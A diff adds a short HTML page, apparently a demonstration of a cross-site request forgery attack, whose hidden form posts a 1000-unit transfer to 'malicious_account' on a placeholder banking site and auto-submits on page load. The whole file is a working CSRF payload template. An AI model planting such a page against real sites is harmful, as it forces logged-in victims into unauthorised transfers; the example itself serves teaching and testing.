@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CSRF Attack Exemple</title>
+</head>
+<body>
+  <h1>Attaque CSRF Exemple</h1>
+    <form id="csrfForm" action="https://legitimie-site.com/transfer" method="POST">
+      <input type="hidden" name="amount" value="1000">
+      <input type="hidden" name="to_account" value="malicious_account">
+  </form>
+</body>
+  <script type="text/javascript">
+    document.getElementById("csrfForm").submit();
+  </script>
+</html> 
